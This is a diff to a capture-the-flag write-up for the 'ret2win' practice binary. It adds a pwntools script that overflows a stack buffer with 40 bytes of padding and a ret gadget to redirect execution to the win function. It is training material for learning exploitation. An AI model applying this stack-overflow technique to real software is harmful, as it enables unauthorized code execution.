@@ -23,6 +23,25 @@ We found it with ropper
 ![Alt Text](img/ret_gadget.png)
 
 After these we wrote a simply python script with pwntools and we took the flag!
+
+#!/usr/bin/env python3 
+from pwn import *
+
+elf = context.binary = ELF('./ret2win', checksec=False)
+p = process(elf.path)
+
+padding = b"A" * 40
+ret_gadget = 0x40053e #ret address
+
+payload = flat(
+        padding,
+        ret_gadget,
+        elf.symbols.ret2win
+        )
+
+p.sendlineafter(b'>', payload)
+success(p.recvall())
+
 ![Alt Text](img/successful_pwntools_exploit.png)
 
 We even write a manual exploit in terminal using python2 that has a lot of fun.
